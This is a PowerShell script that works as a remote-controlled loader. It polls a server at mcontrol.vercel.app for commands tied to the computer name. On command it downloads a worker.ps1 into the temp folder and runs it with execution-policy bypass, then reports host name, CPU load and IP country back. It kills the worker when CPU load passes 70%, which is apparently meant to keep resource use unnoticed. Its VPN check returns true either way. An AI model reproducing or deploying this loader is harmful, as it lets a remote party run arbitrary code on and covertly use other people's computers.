$SERVER = "https://mcontrol.vercel.app/"
$SYSTEM = $env:COMPUTERNAME

$TEMP_DIR = "$env:TEMP\worker_env"
$WORKER = $null
$CPU_LIMIT = 70

function Get-CPU {
    (Get-Counter '\Processor(_Total)\% Processor Time').CounterSamples.CookedValue
}

function Check-VPN {
 
    try {
$headers = @{
            "User-Agent" = "Mozilla/5.0"
        }

        $info = Invoke-RestMethod `
            -Uri "https://ipinfo.io/json" `
            -Headers $headers `
            -TimeoutSec 10

        $country = $info.country
        Write-Host "Info:$info.country"
        Write-Host "Public IP Country: $country"
        if ($WORKER -and $WORKER.HasExited) {
        Write-Host "Worker crashed. Restarting."
        Start-Worker
}

        if ($country -ne "IN") {
            return $true
        }
        else {
            return $true
        }
    }
     catch {
        Write-Host "VPN check failed: $($_.Exception.Message)"
        return $false
    }
}
function Send-Status($running,$cpu,$vpnStatus){
  
    $data = @{
        id = $SYSTEM
        running = $running
        cpu = [int]$cpu
        vpn = $vpnStatus
    } | ConvertTo-Json

Invoke-RestMethod `
 -Uri "https://mcontrol.vercel.app/api/status" `
 -Method POST `
 -ContentType "application/json" `
 -Body $data

}

function Get-Command {
    try {
        (Invoke-RestMethod "$SERVER/api/command?id=$SYSTEM").command
    } catch {
        "stop"
    }
}

function Start-Worker{

    # If worker is already running, do nothing
    if ($WORKER) { return }

    # Temporary directory for the worker
    if (!(Test-Path $TEMP_DIR)) {
        New-Item -ItemType Directory -Force -Path $TEMP_DIR | Out-Null
    }

    # Download the worker.ps1 from URL to TEMP_DIR
    $workerUrl = "https://mcontrol.vercel.app/worker.ps1"
    $workerFile = "$TEMP_DIR\worker.ps1"

    Write-Host "Downloading worker from $workerUrl..."
    Invoke-WebRequest -Uri $workerUrl -OutFile $workerFile -UseBasicParsing

    # Start the worker.ps1 as a separate PowerShell process
    $global:WORKER = Start-Process powershell `
        -ArgumentList "-ExecutionPolicy Bypass -File `"$workerFile`"" `
        -PassThru

    Write-Host "Worker started with PID $($WORKER.Id)"
    
    # Optional: send "running" status to dashboard immediately
    Send-Status $true
}


function Stop-Worker {

    if ($WORKER) {
        Stop-Process -Id $WORKER.Id -Force
        $global:WORKER = $null
    }

    if (Test-Path $TEMP_DIR) {
        Remove-Item $TEMP_DIR -Recurse -Force
    }
}

while($true){

    $cpu = Get-CPU
    $cmd = Get-Command

    if($cpu -gt $CPU_LIMIT){
        Stop-Worker
    }

    if($cmd -eq "start"){ Start-Worker }
    if($cmd -eq "stop"){ Stop-Worker }

    $running = $WORKER -ne $null

    $vpnStatus = Check-VPN
    Send-Status $running $cpu $vpnStatus

    Start-Sleep 30
}
